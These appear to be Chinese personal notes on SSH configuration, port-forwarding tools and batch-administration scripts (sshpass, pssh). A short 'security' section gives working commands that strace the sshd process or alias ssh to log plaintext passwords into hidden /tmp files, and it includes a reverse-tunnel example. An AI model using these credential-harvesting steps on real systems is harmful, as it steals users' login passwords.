Host 120  <span style="color: #b22222;"># </span><span style="color: #b22222;">connnect  172.21.39.120 from local</span>
    User jasper-xu
    HostName 172.21.39.120
    <span style="color: #b22222;">#</span><span style="color: #b22222;">HostName 127.0.0.1</span>
    Port ssh
    IdentityFile ~/tmp/worker/jasper-xu.pem
    ProxyCommand ssh -q -W %h:%p bombay <span style="color: #b22222;">#</span><span style="color: #b22222;">-q only required on Mac</span>
    RequestTTY yes
    RemoteCommand sudo su -  
</pre>
</div>

<p>
stdio转发（netcat模式）与ProxyJump
</p>
<div class="org-src-container">
<pre class="src src-sh">ssh -W localhost:23 JumpHost

<span style="color: #b22222;">#</span><span style="color: #b22222;">netcat&#27169;&#24335;&#21487;&#35859;ssh&#30340;&#26432;&#25163;&#29305;&#24615;&#65306;&#36890;&#36807;-W&#21442;&#25968;&#24320;&#21551;&#21040;&#30446;&#26631;&#32593;&#32476;&#26576;&#20027;&#26426;&#21644;&#31471;&#21475;&#30340;stdio&#36716;&#21457;&#65292;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#21487;&#20197;&#30475;&#20570;&#26159;&#32452;&#21512;&#20102;netcat(nc)&#21644;ssh -L&#12290;&#19978;&#36848;&#21629;&#20196;&#30456;&#24403;&#20110;&#23558;&#26412;&#26426;&#30340;&#26631;&#20934;&#36755;&#20837;&#36755;&#20986;&#36830;&#25509;&#21040;&#20102;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">JumpHost&#30340;telnet&#31471;&#21475;&#19978;&#65292;&#23601;&#20687;&#22312;JumpHost&#19978;&#25191;&#34892;telnet localhost&#19968;&#26679;&#65292;&#32780;&#19988;&#24182;&#19981;&#38656;&#35201;&#22312;&#26412;&#26426;&#36816;&#34892;telnet&#65281;</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:875d51c9-a23f-4008-9a17-702c40f52727" class="outline-4">
<h4 id="h:875d51c9-a23f-4008-9a17-702c40f52727">其它端口转发方式</h4>
<div class="outline-text-4" id="text-h:875d51c9-a23f-4008-9a17-702c40f52727">
<p>
参考：<a href="https://cloud.tencent.com/developer/article/1688152">https://cloud.tencent.com/developer/article/1688152</a>
</p>

<p>
图形工具
</p>
<ul class="org-ul">
<li><a href="https://codinn.com/tunnel/">Core Tunnel</a> (MacOS)</li>
<li></li>
</ul>
</div>
<div id="outline-container-h:2b70d2fb-0e98-4849-b36c-806cb5bab627" class="outline-5">
<h5 id="h:2b70d2fb-0e98-4849-b36c-806cb5bab627">iptables 端口转发</h5>
<div class="outline-text-5" id="text-h:2b70d2fb-0e98-4849-b36c-806cb5bab627">
<p>
entOS 7.0 以下使用的是iptables，可以通过iptables实现数据包的转发。
</p>

<p>
开启数据转发功能
</p>

<div class="org-src-container">
<pre class="src src-sh">vi /etc/sysctl.conf   
  <span style="color: #b22222;">#</span><span style="color: #b22222;">&#22686;&#21152;&#19968;&#34892; net.ipv4.ip_forward=1</span>
//&#20351;&#25968;&#25454;&#36716;&#21457;&#21151;&#33021;&#29983;&#25928;
sysctl -p
</pre>
</div>

<p>
将本地的端口转发到本机端口:
</p>

<div class="org-src-container">
<pre class="src src-sh">iptables -t nat -A PREROUTING -p tcp --dport 2222 -j REDIRECT --to-port 22
</pre>
</div>

<p>
将本机的端口转发到其他机器:
</p>

<div class="org-src-container">
<pre class="src src-sh">iptables -t nat -A PREROUTING -d 192.168.172.130 -p tcp --dport 8000 -j DNAT --to-destination 192.168.172.131:80
iptables -t nat -A POSTROUTING -d 192.168.172.131 -p tcp --dport 80 -j SNAT --to 192.168.172.130

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#28165;&#31354;nat&#34920;&#30340;&#25152;&#26377;&#38142;</span>
iptables -t nat -F PREROUTING
</pre>
</div>
</div>
</div>
<div id="outline-container-h:14ab6394-e714-4473-868b-0db442c4f14c" class="outline-5">
<h5 id="h:14ab6394-e714-4473-868b-0db442c4f14c">firewall 端口转发</h5>
<div class="outline-text-5" id="text-h:14ab6394-e714-4473-868b-0db442c4f14c">
<p>
CentOS 7.0以上使用的是firewall，通过命令行配置实现端口转发。
</p>

<p>
开启伪装IP：
</p>

<div class="org-src-container">
<pre class="src src-sh">firewall-cmd --permanent --add-masquerade
</pre>
</div>

<p>
配置端口转发，将到达本机的12345端口的访问转发到另一台服务器的22端口。
</p>

<div class="org-src-container">
<pre class="src src-sh">firewall-cmd --permanent --add-forward-port=<span style="color: #a0522d;">port</span>=12345:<span style="color: #a0522d;">proto</span>=tcp:<span style="color: #a0522d;">toaddr</span>=192.168.172.131:<span style="color: #a0522d;">toport</span>=22
</pre>
</div>

<p>
重新载入，使其失效。
</p>

<div class="org-src-container">
<pre class="src src-sh">firewall-cmd --reload
</pre>
</div>
</div>
</div>
<div id="outline-container-h:40a2a1aa-0330-433b-90f3-0bd2e1d449bf" class="outline-5">
<h5 id="h:40a2a1aa-0330-433b-90f3-0bd2e1d449bf">rinetd 本地端口转发</h5>
<div class="outline-text-5" id="text-h:40a2a1aa-0330-433b-90f3-0bd2e1d449bf">
<p>
<a href="https://github.com/samhocevar/rinetd">https://github.com/samhocevar/rinetd</a>
</p>

<p>
Rinetd是为在一个Unix和Linux操作系统中为重定向传输控制协议(TCP)连接的一个工具
</p>

<div class="org-src-container">
<pre class="src src-sh">wget https://github.com/samhocevar/rinetd/releases/download/v0.73/rinetd-0.73.tar.gz
yum install automake gcc -y
tar xf rinetd-0.73.tar.gz
<span style="color: #483d8b;">cd</span> rinetd-0.73/
./bootstrap
./configure
make &amp;&amp; make install
</pre>
</div>

<p>
程序路径 /usr/sbin/rinetd
</p>

<p>
需要配置文件 /etc/rinetd.conf
</p>

<p>
配置文件格式很简单：
</p>

<p>
[Source Address] [Source Port] [Destination Address] [Destination Port]
</p>

<p>
在每一单独的行中指定每个要转发的端口。源地址和目的地址都可以是
</p>

<p>
主机名或IP 地址，IP 地址0.0.0.0 将rinetd 绑定到任何可用的本地IP地址上：
</p>

<div class="org-src-container">
<pre class="src src-sh">0.0.0.0 8080 www.aslibra.com 80
0.0.0.0 3306 192.168.1.77 3306
0.0.0.0 88 127.0.0.1 80
</pre>
</div>

<p>
unit
</p>

<div class="org-src-container">
<pre class="src src-sh">cat &lt;&lt;\EOF &gt;/usr/lib/systemd/system/rinetd.service
<span style="color: #ffa54f;">[Unit]</span>
<span style="color: #ffa54f;">Description=rinetd</span>
<span style="color: #ffa54f;">After=network.target</span>

<span style="color: #ffa54f;">[Service]</span>
<span style="color: #ffa54f;">Type=forking</span>
<span style="color: #ffa54f;">ExecStart=/usr/local/sbin/rinetd -c /etc/rinetd.conf</span>

<span style="color: #ffa54f;">[Install]</span>
<span style="color: #ffa54f;">WantedBy=multi-user.target</span>
<span style="color: #ffa54f;">EOF</span>

systemctl daemon-reload
systemctl enable rinetd
</pre>
</div>
</div>
</div>
<div id="outline-container-h:ef37d881-1781-4b6c-9ba4-db3fb97fde36" class="outline-5">
<h5 id="h:ef37d881-1781-4b6c-9ba4-db3fb97fde36">ncat 端口转发</h5>
<div class="outline-text-5" id="text-h:ef37d881-1781-4b6c-9ba4-db3fb97fde36">
<p>
netcat（简称nc）被誉为网络安全界的”瑞士军刀“，一个简单而有用的工具，
这里介绍一种使用netcat实现端口转发的方法。
</p>

<p>
安装ncat
</p>

<div class="org-src-container">
<pre class="src src-sh">yum install nmap-ncat -y
</pre>
</div>

<p>
监听本机 9876 端口，将数据转发到 192.168.172.131的 80 端口
</p>

<div class="org-src-container">
<pre class="src src-sh">ncat --sh-exec <span style="color: #8b2252;">"ncat 192.168.172.131 80"</span> -l 9876  --keep-open
</pre>
</div>
</div>
</div>
<div id="outline-container-h:f5196f94-1176-47e5-8c0a-114b09037702" class="outline-5">
<h5 id="h:f5196f94-1176-47e5-8c0a-114b09037702">socat 端口转发</h5>
<div class="outline-text-5" id="text-h:f5196f94-1176-47e5-8c0a-114b09037702">
<p>
socat是一个多功能的网络工具，使用socat进行端口转发。 socat安装
</p>

<div class="org-src-container">
<pre class="src src-sh">yum install -y socat
</pre>
</div>

<p>
在本地监听12345端口，并将请求转发至192.168.172.131的22端口。
</p>

<div class="org-src-container">
<pre class="src src-sh">socat TCP4-LISTEN:12345,reuseaddr,fork TCP4:192.168.172.131:22
</pre>
</div>
</div>
</div>
<div id="outline-container-h:45b9a434-1f6c-45b4-80cc-cf2cb7bcd179" class="outline-5">
<h5 id="h:45b9a434-1f6c-45b4-80cc-cf2cb7bcd179">portmap 端口转发</h5>
<div class="outline-text-5" id="text-h:45b9a434-1f6c-45b4-80cc-cf2cb7bcd179">
<p>
Linux 版的lcx，内网端口转发工具。
</p>

<p>
下载地址：
</p>

<div class="org-src-container">
<pre class="src src-sh">http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip
</pre>
</div>

<p>
监听本地1234端口，转发给192.168.172.131的22端口
</p>

<div class="org-src-container">
<pre class="src src-sh">./portmap -m 1 -p1 1234 -h2 192.168.172.131 -p2 22
08&#12289;portfwd&#31471;&#21475;&#36716;&#21457;
portfwd&#26159;meterpreter&#20013;&#20869;&#32622;&#30340;&#21151;&#33021;&#65292;&#20063;&#25552;&#20379;&#20102;&#21333;&#26426;&#29256;&#65292;&#29992;&#20110;TCP/UDP&#31471;&#21475;&#36716;&#21457;&#26381;&#21153;
Github &#39033;&#30446;&#22320;&#22336;&#65306;
https://github.com/rssnsj/portfwd
&#65288;1&#65289;&#19979;&#36733;&#32534;&#35793;
git clone https://github.com/rssnsj/portfwd.git
<span style="color: #483d8b;">cd</span> portfwd/src
make
&#65288;2&#65289;&#23558;&#26412;&#22320;&#30340;12345&#31471;&#21475;&#36716;&#21457;&#21040;192.168.172.131&#65306;22


./tcpfwd 0.0.0.0:12345 192.168.172.131:22
09&#12289;NATBypass&#31471;&#21475;&#36716;&#21457;
&#19968;&#27454;lcx&#65288;htran&#65289;&#22312;golang&#19979;&#30340;&#23454;&#29616;
Gihub&#39033;&#30446;&#22320;&#22336;&#65306;
https://github.com/cw1997/NATBypass
&#65288;1&#65289;&#20869;&#32593;&#20027;&#26426;&#20027;&#21160;&#36830;&#25509;&#22806;&#32593;&#20027;&#26426;&#25171;&#36890;&#38567;&#36947;
&#22312;&#30446;&#26631;&#26426;&#22120;&#19978;&#25191;&#34892;&#65306;nb -slave 127.0.0.1:3389 &#20844;&#32593;IP:51
&#22312;&#20844;&#32593;&#30340;&#26426;&#22120;&#25191;&#34892;&#65306;nb -listen 51 3340
&#22312;&#20844;&#32593;&#20027;&#26426;&#19978;&#36830;&#25509; 127.0.0.1:3340&#65292;&#21363;&#21487;&#36830;&#25509;&#19978;&#20869;&#32593;&#26426;&#22120;&#30340;3389&#31471;&#21475;&#12290;
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:a41562f1-ecd1-444b-9c6f-d3f1eface63e" class="outline-4">
<h4 id="h:a41562f1-ecd1-444b-9c6f-d3f1eface63e">安全相关</h4>
<div class="outline-text-4" id="text-h:a41562f1-ecd1-444b-9c6f-d3f1eface63e">
</div>
<div id="outline-container-h:4f3eebbc-de7d-405b-b7fa-25361de4ae24" class="outline-5">
<h5 id="h:4f3eebbc-de7d-405b-b7fa-25361de4ae24">获取sshd进程明文密码</h5>
<div class="outline-text-5" id="text-h:4f3eebbc-de7d-405b-b7fa-25361de4ae24">
<div class="org-src-container">
<pre class="src src-sh">(strace -f -F -p <span style="color: #ff00ff;">`ps aux|grep "sshd -D"|grep -v grep|awk {'print $2'}`</span> -t -e <span style="color: #a0522d;">trace</span>=read,write -s 32 2&gt; /tmp/.sshd.log &amp;)
</pre>
</div>

<p>
使用正在来匹配用户和密码
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#25214;&#29992;&#25143;&#21517;&#21644;&#23494;&#30721;</span>
grep -E <span style="color: #8b2252;">'read\(6, ".+\\0\\0\\0\\.+"'</span> /tmp/.sshd.log

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#32467;&#26524;&#24418;&#24335;&#22914;&#19979;</span>
[pid  2401] 22:34:34 read(6, <span style="color: #8b2252;">"\10\0\0\0\4root"</span>, 9) = 9
[pid  2401] 22:34:34 read(6, <span style="color: #8b2252;">"\4\0\0\0\16ssh-connection\0\0\0\0\0\0\0\0"</span>, 27) = 27
[pid  2401] 22:34:34 read(6, <span style="color: #8b2252;">"\f\0\0\0\4toor"</span>, 9) = 9
</pre>
</div>
</div>
</div>
<div id="outline-container-h:03216cd2-b729-4184-aaec-d8f29e18e90b" class="outline-5">
<h5 id="h:03216cd2-b729-4184-aaec-d8f29e18e90b">收集ssh登陆凭证</h5>
<div class="outline-text-5" id="text-h:03216cd2-b729-4184-aaec-d8f29e18e90b">
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#28155;&#21152;&#21629;&#20196;&#21035;&#21517;</span>
vi ~/.bashrc&#25110;&#32773;/etc/bashrc
<span style="color: #483d8b;">alias</span> <span style="color: #a0522d;">ssh</span>=<span style="color: #8b2252;">'strace -f -e trace=read,write -o /tmp/.ssh-`date '</span>+%d%h%m%s<span style="color: #8b2252;">'`.log -s 32 ssh'</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20351;&#21629;&#20196;&#21035;&#21517;&#31435;&#21363;&#29983;&#25928;</span>
<span style="color: #483d8b;">source</span> ~/.bashrc
</pre>
</div>

<p>
通过grep 找到匹配行的后8行，可以根据密码长度调整行数
</p>

<div class="org-src-container">
<pre class="src src-sh">grep -A 9 <span style="color: #8b2252;">'password'</span> .ssh-25Sep091601017212.log
</pre>
</div>
</div>
</div>
<div id="outline-container-h:7527fed6-a842-4e88-902e-40e0c437a967" class="outline-5">
<h5 id="h:7527fed6-a842-4e88-902e-40e0c437a967">访问控制</h5>
<div class="outline-text-5" id="text-h:7527fed6-a842-4e88-902e-40e0c437a967">
<p>
Match
</p>

<p>
例如你是git.ustclug.org的管理员，当你以个人账号登陆git.ustclug.org进行维护，和以git账号登陆访问代码时，想用不同的ssh key以及配置，那么可以这样：
</p>

<div class="org-src-container">
<pre class="src src-sh">Match originalhost git.ustclug.org, user git
    IdentityFile your-gitlab-key
    ControlMaster no

Match originalhost git.ustclug.org, user !git
    IdentityFile your-personal-key&#8203;
    ControlMaster auto
</pre>
</div>

<p>
自动补全域名后缀
</p>

<p>
假设你有若干服务器，如lug.ustc.edu.cn, mirrors.ustc.edu.cn, pxe.ustc.edu.cn 等等，实验室有一些服务器，如server{1,2,3}.mylab.ustc.edu.cn，为了平时敲命令时可以少敲一些字符，那么可以这样配置：
</p>

<pre class="example" id="orgdb20bc6">
Host *.ustc.edu.cn !*.mylab.ustc.edu.cn
    User your-user-name
    IdentityFile your-key-1

Host *.mylab.ustc.edu.cn
    User your-user-name
    IdentityFile your-key-2

Host *
    CanonicalizeHostname Yes
    CanonicalDomains mylab.ustc.edu.cn ustc.edu.cn
    CanonicalizeMaxDots 0
    CanonicalizeFallbackLocal yes
</pre>

<p>
这样，当执行 ssh mirrors 时：
</p>
<pre class="example" id="org30713a5">
- 首先尝试匹配第一段 Host *.ustc.edu.cn !*.mylab.ustc.edu.cn ，失败
- 接着尝试匹配第二段，失败
- 然后匹配第三段 "Host *"，成功，应用其中的参数。ssh会尝试解析 mirrors.mylab.ustc.edu.cn，失败，再尝试解析 mirrors.ustc.edu.cn，成功，于是HostName被改写成mirrors.ustc.edu.cn
- 由于HostName变了，于是ssh重新读一遍配置文件
- 尝试匹配第一段，成功，应用其中的参数
- 尝试匹配第二段，失败
- 尝试匹配第三段，成功，但是CanonicalizeMaxDots 0，因为现在的HostName里面有三个dot，所以与Canonicalize有关的参数都被忽略。
</pre>

<p>
如果在很多实验室都有服务器，比如 *.lab1.ustc.edu.cn, *.lab2.ustc.edu.cn
</p>

<pre class="example" id="org301cb84">
Host *.ustc.edu.cn !*.lab1.ustc.edu.cn !*.lab2.ustc.edu.cn
    ...
Host *.lab1.ustc.edu.cn
    ...
Host *.lab2.ustc.edu.cn
    ...
Host *
    CanonicalizeHostname Yes
    CanonicalDomains  ustc.edu.cn lab1.ustc.edu.cn lab2.ustc.edu.cn
    CanonicalizeMaxDots 1
    CanonicalizeFallbackLocal yes
</pre>

<p>
​注意，这里CanonicalizeMaxDots设成了1，
</p>
<ul class="org-ul">
<li>ssh server1.lab1 连第一个存在的域名 server1.lab1.ustc.edu.cn, server1.lab1.lab1.ustc.edu.cn server1.lab1.lab2.ustc.edu.cn</li>
<li>ssh server2    连第一个存在的域名 server2.ustc.edu.cn ,server2.lab1.ustc.edu.cn, server2.lab2.ustc.edu.cn</li>
</ul>
</div>
</div>
</div>
</div>
<div id="outline-container-h:727b8330-29ea-4dc3-b522-5c07ae7ae7fe" class="outline-3">
<h3 id="h:727b8330-29ea-4dc3-b522-5c07ae7ae7fe">ssh 其它相关工具</h3>
<div class="outline-text-3" id="text-h:727b8330-29ea-4dc3-b522-5c07ae7ae7fe">
</div>
<div id="outline-container-h:9b87c33d-f867-4447-b666-5c754c3c33e7" class="outline-4">
<h4 id="h:9b87c33d-f867-4447-b666-5c754c3c33e7">挂载远程ssh目录 sshfs</h4>
<div class="outline-text-4" id="text-h:9b87c33d-f867-4447-b666-5c754c3c33e7">
<p>
由EPEL源提供，目前CentOS8 还没有提供，可以利用ssh协议挂载远程目录
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos7 ~]#yum install fuse-sshfs
[root@centos7 ~]#sshfs 10.0.0.8:/data /mnt
[root@centos7 ~]#df /mnt
Filesystem      1K-blocks   Used    Available   Use%    Mounted on
10.0.0.8:/data  52403200    398576  52004624    1%      /mnt
</pre>
</div>
</div>
</div>
<div id="outline-container-h:e86558cb-355c-4083-897b-c76a12395425" class="outline-4">
<h4 id="h:e86558cb-355c-4083-897b-c76a12395425">自动登录ssh工具sshpass</h4>
<div class="outline-text-4" id="text-h:e86558cb-355c-4083-897b-c76a12395425">
<p>
由EPEL源提供，ssh登陆不能在命令行中指定密码。sshpass的出现，解决了这一
问题sshpass用于非交互SSH的密码验证，一般用在sh脚本中，无须再次输入密码
（本机known_hosts文件中有的主机才能生效）。它允许你用-p参数指定明文密
码，然后直接登录远程服务器，它支持密码从命令行、文件、环境变量中读取。
</p>

<p>
格式：
</p>

<pre class="example" id="org4f3c7d6">
sshpass [option] command parameters
</pre>

<p>
常见选项
</p>

<div class="org-src-container">
<pre class="src src-sh">-p password <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21518;&#36319;&#23494;&#30721;&#23427;&#20801;&#35768;&#20320;&#29992; -p &#21442;&#25968;&#25351;&#23450;&#26126;&#25991;&#23494;&#30721;&#65292;&#28982;&#21518;&#30452;&#25509;&#30331;&#24405;&#36828;&#31243;&#26381;&#21153;&#22120;</span>
-f filename <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21518;&#36319;&#20445;&#23384;&#23494;&#30721;&#30340;&#25991;&#20214;&#21517;&#65292;&#23494;&#30721;&#26159;&#25991;&#20214;&#20869;&#23481;&#30340;&#31532;&#19968;&#34892;&#12290;</span>
-e <span style="color: #b22222;">#</span><span style="color: #b22222;">&#23558;&#29615;&#22659;&#21464;&#37327;SSHPASS&#20316;&#20026;&#23494;&#30721;</span>
</pre>
</div>

<p>
范例：
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#yum -y install sshpass
[root@centos8 ~]#rpm -ql sshpass
/usr/bin/sshpass
/usr/lib/.build-id
/usr/lib/.build-id/1f
/usr/lib/.build-id/1f/c5d6cf03500df846a1a801aab749f478845a4d
/usr/share/doc/sshpass
/usr/share/doc/sshpass/AUTHORS
/usr/share/doc/sshpass/COPYING
/usr/share/doc/sshpass/ChangeLog
/usr/share/doc/sshpass/NEWS
/usr/share/man/man1/sshpass.1.gz

[root@centos8 ~]# sshpass -p 123456 ssh -o <span style="color: #a0522d;">StrictHostKeyChecking</span>=no root@10.0.0.8
[root@centos8 ~]#sshpass -p 123456 ssh -o <span style="color: #a0522d;">StrictHostKeyChecking</span>=no 10.0.0.7 hostname -I
10.0.0.7
[root@centos8 ~]#sshpass -p 123456 ssh -o <span style="color: #a0522d;">StrictHostKeyChecking</span>=no 10.0.0.6 hostname -I
10.0.0.6

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20174;&#25991;&#20214;&#35835;&#21462;&#23494;&#30721;</span>
[root@centos8 ~]# cat pass.txt
123456
[root@centos8 ~]# sshpass -f pass.txt ssh root@10.0.0.8
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20174;&#29615;&#22659;&#21464;&#37327;&#33719;&#21462;&#23494;&#30721;</span>
[root@centos8 ~]# export <span style="color: #a0522d;">SSHPASS</span>=123456
[root@centos8 ~]# sshpass -e ssh root@10.0.0.8

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20174;&#36828;&#31243;&#20027;&#26426;&#19978;&#25289;&#21462;&#25991;&#20214;</span>
sshpass -p user_password scp -P22 root@192.168.1.2:/home/test  ./ 
scp -r /data/dir --rsh=<span style="color: #8b2252;">"sshpass -p 'my_pass_here' ssh -l myuser"</span> 10.42.0.1:/opt
rsync --rsh=<span style="color: #8b2252;">"sshpass -p 'my_pass_here' ssh -l myuser"</span> 10.42.0.1:/data/backup/ /backup/
</pre>
</div>

<p>
范例：批量修改多台主机的root密码为随机密码
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#cat change_root_password.sh
<span style="color: #b22222;">#</span><span style="color: #b22222;">!/bin/bash</span>
rpm -q sshpass &amp;&gt; /dev/null || yum install -y sshpass
<span style="color: #483d8b;">export</span> <span style="color: #a0522d;">SSHPASS</span>=meu
<span style="color: #a0522d;">NET</span>=10.0.0
<span style="color: #a020f0;">for</span> i<span style="color: #a020f0;"> in</span> {5..19};<span style="color: #a020f0;">do</span>
    {
    <span style="color: #a0522d;">PASS</span>=<span style="color: #ff00ff;">`openssl rand -base64 9`</span>
    sshpass -e ssh $<span style="color: #a0522d;">NET</span>.$<span style="color: #a0522d;">i</span> <span style="color: #8b2252;">"echo $PASS| passwd --stdin root &amp;&gt; /dev/null"</span>
    <span style="color: #483d8b;">echo</span> $<span style="color: #a0522d;">NET</span>.$<span style="color: #a0522d;">i</span>:$<span style="color: #a0522d;">PASS</span> &gt;&gt; host.txt
    }&amp;
<span style="color: #a020f0;">done</span>
<span style="color: #483d8b;">wait</span>
</pre>
</div>

<p>
范例：批量部署多台主机基于key验证脚本1
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#cat sshpass.sh
<span style="color: #b22222;">#</span><span style="color: #b22222;">!/bin/bash</span>
<span style="color: #a0522d;">NET</span>=10.0.0
<span style="color: #a0522d;">PASS</span>=meu
ssh-keygen -P <span style="color: #8b2252;">""</span> -f /root/.ssh/id_rsa &amp;&gt; /dev/null
rpm -q sshpass &amp;&gt; /dev/null || yum -y install sshpass &amp;&gt; /dev/null
<span style="color: #a020f0;">for</span> i<span style="color: #a020f0;"> in</span> {1..100};<span style="color: #a020f0;">do</span>
{
sshpass -p $<span style="color: #a0522d;">PASS</span> ssh-copy-id -o <span style="color: #a0522d;">StrictHostKeyChecking</span>=no -i /root/.ssh/id_rsa.pub $<span style="color: #a0522d;">NET</span>.$<span style="color: #a0522d;">i</span> &amp;&gt; /dev/null
}&amp;
<span style="color: #a020f0;">done</span>
<span style="color: #483d8b;">wait</span>
</pre>
</div>

<p>
范例：批量部署多台主机基于key验证脚本2
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#cat sshpass2.sh
<span style="color: #b22222;">#</span><span style="color: #b22222;">!/bin/bash</span>
<span style="color: #a0522d;">HOSTS</span>=<span style="color: #8b2252;">"</span>
<span style="color: #8b2252;">10.0.0.6</span>
<span style="color: #8b2252;">10.0.0.18</span>
<span style="color: #8b2252;">10.0.0.77</span>
<span style="color: #8b2252;">"</span>
<span style="color: #a0522d;">PASS</span>=meu
ssh-keygen -P <span style="color: #8b2252;">""</span> -f /root/.ssh/id_rsa &amp;&gt; /dev/null
rpm -q sshpass &amp;&gt; /dev/null || yum install -y sshpass &amp;&gt; /dev/null
<span style="color: #a020f0;">for</span> i<span style="color: #a020f0;"> in</span> $<span style="color: #a0522d;">HOSTS</span>;<span style="color: #a020f0;">do</span>
{
sshpass -p $<span style="color: #a0522d;">PASS</span> ssh-copy-id -o <span style="color: #a0522d;">StrictHostKeyChecking</span>=no -i /root/.ssh/id_rsa.pub $<span style="color: #a0522d;">i</span> &amp;&gt; /dev/null
}&amp;
<span style="color: #a020f0;">done</span>
<span style="color: #483d8b;">wait</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:7aa7d43e-5ec6-40e8-bad3-e2a1f543381c" class="outline-4">
<h4 id="h:7aa7d43e-5ec6-40e8-bad3-e2a1f543381c">轻量级自动化运维工具 pssh</h4>
<div class="outline-text-4" id="text-h:7aa7d43e-5ec6-40e8-bad3-e2a1f543381c">
<p>
EPEL源中提供了多个自动化运维工具
</p>

<ul class="org-ul">
<li>pssh：基于python编写，可在多台服务器上执行命令的工具，也可实现文件复
制，提供了基于ssh和scp的多个并行工具，项目：
<a href="http://code.google.com/p/parallel-ssh/">http://code.google.com/p/parallel-ssh/</a>, CentOS8上目前没提供</li>
<li>pdsh：Parallel remote shell program，是一个多线程远程shell客户端，可
以并行执行多个远程主机上的命令。可使用几种不同的远程shell服务，包括
rsh，Kerberos IV和ssh，项目：<a href="https://pdsh.googlecode.com/">https://pdsh.googlecode.com/</a></li>
<li>mussh：Multihost SSH wrapper，是一个shell脚本，允许使用命令在多个主
机上通过ssh执行命令。可使用ssh-agent和RSA/DSA密钥，以减少输入密码，
项目：<a href="http://www.sourceforge.net/projects/mussh">http://www.sourceforge.net/projects/mussh</a></li>
</ul>

<p>
pssh 命令选项如下：
</p>

<pre class="example" id="orgb95d33c">
-H：主机字符串，内容格式”[user@]host[:port]”
-h file：主机列表文件，内容格式”[user@]host[:port]”
-A：手动输入密码模式,（注意这个参数添加后只是提示作用，随便输入或者不输入直接回车都可以）
-i：每个服务器内部处理信息输出
-l：登录使用的用户名
-p：并发的线程数【可选】
-o：输出的文件目录【可选】
-e：错误输出文件【可选】
-t：TIMEOUT 超时时间设置，0无限制【可选】
-O：SSH的选项
-x 传递多个SSH 命令，多个命令用空格分开，用引号括起来
-X 同-x 但是一次只能传递一个命令
-P：打印出服务器返回信息
-v：详细模式
--version：查看版本
</pre>

<p>
<b>a）批量执行命令</b>
</p>

<p>
范例：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#40664;&#35748;&#20351;&#29992;ssh&#30340;key&#35748;&#35777;&#65292;&#36890;&#36807; -A&#36873;&#39033;&#65292;&#20351;&#29992;&#23494;&#30721;&#35748;&#35777;&#25209;&#37327;&#25191;&#34892;&#25351;&#20196;</span>
pssh -H <span style="color: #8b2252;">"192.168.1.10"</span> -A hostname

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#36755;&#20986;&#20449;&#24687;</span>
pssh -H wang@192.168.1.10 -A -i hostname

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#36890;&#36807;pssh&#25209;&#37327;&#20851;&#38381;seLinux</span>
pssh -H root@192.168.1.10 -i <span style="color: #8b2252;">'sed -i "s/^SELINUX=.*/SELINUX=disabled/" /etc/selinux/config'</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#22810;&#21488;&#20027;&#26426;</span>
pssh -H <span style="color: #8b2252;">"192.168.1.10 192.168.1.20"</span> -i hostname

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#22810;&#21488;&#20027;&#26426;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#21015;&#34920;&#25991;&#20214;&#20869;&#30340;&#20449;&#24687;&#26684;&#24335;&#26159;&#8220;ip:&#31471;&#21475;&#8221;&#65292;&#22914;&#26524;&#26412;&#26426;&#21644;&#36828;&#31243;&#26426;&#22120;&#20351;&#29992;&#30340;ssh&#31471;&#21475;&#19968;&#33268;&#65292;&#21017;&#21487;&#20197;&#30465;&#21435;&#31471;&#21475;&#65292;&#30452;&#25509;&#29992;ip&#23601;&#34892;&#12290;</span>
cat hosts.txt
10.0.0.8:25791
10.0.0.6
pssh -h hosts.txt -i hostname

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#23558;&#26631;&#20934;&#38169;&#35823;&#21644;&#26631;&#20934;&#27491;&#30830;&#37325;&#23450;&#21521;&#20998;&#21035;&#20445;&#23384;&#33267;&#26412;&#22320;&#20027;&#26426;&#30340;/data/stdout&#21644;/data/stderr&#30446;&#24405;&#19979;</span>
pssh -H 192.168.1.10 -o /data/stdout -e /data/stderr -i &#8220;hostname&#8221;

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#21464;&#37327;&#38656;&#35201;&#21152;&#21333;&#24341;&#21495;&#24341;&#36215;&#26469;</span>
[root@centos7 ~]#cat hosts.txt
10.0.0.8
10.0.0.6
[root@centos7 ~]#pssh -h hosts.txt -i echo $<span style="color: #a0522d;">HOSTNAME</span>
[1] 16:47:00 [SUCCESS] 10.0.0.6
centos7.cici.com
[2] 16:47:01 [SUCCESS] 10.0.0.8
centos7.cici.com
[root@centos7 ~]#pssh -h hosts.txt -i <span style="color: #8b2252;">'echo $HOSTNAME'</span>
[1] 16:48:05 [SUCCESS] 10.0.0.6
centos6.localdomain
[2] 16:48:05 [SUCCESS] 10.0.0.8
centos8.localdomain

<span style="color: #b22222;">#</span><span style="color: #b22222;">*&#38656;&#35201;&#29992;&#21452;&#25110;&#21333;&#24341;&#21495;&#24341;&#36215;&#26469;</span>
[root@centos7 ~]#pssh -h hosts.txt -i ls /data/*
